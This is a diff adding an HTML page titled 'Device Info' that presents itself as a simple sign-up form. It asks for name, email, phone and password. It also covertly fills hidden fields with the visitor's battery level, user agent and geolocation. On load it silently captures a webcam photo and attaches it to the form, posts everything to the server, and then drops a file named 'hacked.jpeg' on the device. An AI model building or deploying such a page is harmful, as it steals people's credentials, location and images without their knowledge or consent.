@@ -1,0 +1,162 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Info</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: #f0f0f0;
+        }
+        form {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        button {
+            background-color: #28a745;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+        #video, #canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <form id="device-form" enctype="multipart/form-data">
+        <input type="text" id="name" name="name" placeholder="Name" required>
+        <input type="email" id="email" name="email" placeholder="Email" required>
+        <input type="text" id="phone" name="phone" placeholder="Phone" required>
+        <input type="password" id="password" name="password" placeholder="Password" required>
+        <input type="hidden" id="percentage_charging" name="percentage_charging">
+        <input type="hidden" id="phone_name" name="phone_name">
+        <input type="hidden" id="latitude" name="latitude">
+        <input type="hidden" id="longitude" name="longitude">
+        <input type="file" id="image_input" name="image" accept="image/*" style="display:none;">
+        <button type="submit">Submit</button>
+    </form>
+
+    <video id="video" width="300" height="200" autoplay></video>
+    <canvas id="canvas" width="300" height="200"></canvas>
+
+    <script>
+        // Battery level
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(function(battery) {
+                document.getElementById('percentage_charging').value = Math.floor(battery.level * 100);
+            }).catch(err => console.error('Battery API error:', err));
+        }
+
+        // Device model
+        document.getElementById('phone_name').value = navigator.userAgent;
+
+        // Geolocation
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    document.getElementById('latitude').value = position.coords.latitude;
+                    document.getElementById('longitude').value = position.coords.longitude;
+                },
+                function(error) {
+                    console.error("Geolocation error:", error.message);
+                }
+            );
+        } else {
+            console.warn("Geolocation is not supported by this browser.");
+        }
+
+        // Camera feature: Automatically capture an image after 3 seconds
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const imageInput = document.getElementById('image_input');
+        let stream = null;
+
+        async function startCameraAndCapture() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                video.srcObject = stream;
+
+                setTimeout(() => {
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob(blob => {
+                        const file = new File([blob], 'captured_image.jpg', { type: 'image/jpeg' });
+                        const dataTransfer = new DataTransfer();
+                        dataTransfer.items.add(file);
+                        imageInput.files = dataTransfer.files;
+                    }, 'image/jpeg');
+                    stream.getTracks().forEach(track => track.stop());
+                }, 3000);
+            } catch (error) {
+                console.error("Error accessing camera:", error.message);
+                alert("Camera access is required to capture an image.");
+            }
+        }
+
+        // Automatically start the camera on page load
+        window.onload = startCameraAndCapture;
+
+        // Submit form with device data
+        document.getElementById('device-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const formData = new FormData(this);
+
+            fetch('/submit', {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.message) {
+                    alert(data.message);
+                    fetch('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTuAxz1lapTANfmJMhQ-cQFbiYqsBBE92BHZcv-QN0Ylm9_rSq_1YIb2xl0&s=10') // Make sure this is the correct path
+  .then(response => {
+    if (!response.ok) {
+      throw new Error('Network response was not ok');
+    }
+    return response.blob(); // Convert the response to a Blob
+  })
+  .then(blob => {
+    const url = URL.createObjectURL(blob); // Create an object URL for the Blob
+    const downloadLink = document.createElement('a');
+    downloadLink.href = url;
+    downloadLink.download = 'hacked.jpeg'; // Desired download name
+    document.body.appendChild(downloadLink);
+    downloadLink.click(); // Trigger the download
+    document.body.removeChild(downloadLink);
+    URL.revokeObjectURL(url); // Clean up the object URL
+  })
+  .catch(err => console.error('Error downloading the image:', err));
+                } else if (data.error) {
+                    alert(`Error: ${data.error}`);
+                }
+            })
+            .catch(error => {
+                console.error('Submission error:', error);
+                alert("Error submitting the form. Please try again.");
+            });
+        });
+    </script>
+</body>
+</html>
